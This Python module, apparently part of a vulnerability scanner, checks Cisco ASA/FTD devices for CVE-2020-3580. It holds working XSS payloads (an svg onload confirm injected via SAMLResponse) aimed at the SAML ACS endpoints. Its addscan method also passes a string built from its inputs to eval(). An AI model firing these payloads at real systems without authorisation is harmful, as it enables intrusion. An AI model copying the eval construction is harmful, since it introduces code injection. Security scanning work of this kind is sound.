#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Cisco相关设备/页面扫描类: 
        Cisco ASA设备/FTD设备 XSS跨站脚本攻击
            CVE-2020-3580
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_int_2
from lib.tool.thread import thread
from payloads.Cisco.cve_2020_3580 import cve_2020_3580_scan

class Cisco():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Cisco'
        self.md = md5(self.app_name)
        
        self.random_num_1, self.random_num_2 = random_int_2(5)
        self.random_num = self.random_num_1 + self.random_num_2

        self.cve_2020_3580_payloads = [
            {
                'path': '+CSCOE+/saml/sp/acs?tgname=a',
                'data': 'SAMLResponse=%22%3e%3csvg%2fonload%3dconfirm(\'{}\')%3e'.format(self.random_num)
            },
            {
                'path': 'saml/sp/acs?tgname=a',
                'data': 'SAMLResponse=%22%3e%3csvg%2fonload%3dconfirm(\'{}\')%3e'.format(self.random_num)
            },
            # {
            #     'path': 'sp/acs?tgname=a',
            #     'data': 'SAMLResponse=%22%3e%3csvg%2fonload%3dconfirm(\'{}\')%3e'.format(self.random_num)
            # },
            # {
            #     'path': 'acs?tgname=a',
            #     'data': 'SAMLResponse=%22%3e%3csvg%2fonload%3dconfirm(\'{}\')%3e'.format(self.random_num)
            # }
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2020_3580_scan, url=url)
        ]

Cisco.cve_2020_3580_scan = cve_2020_3580_scan

cisco = Cisco()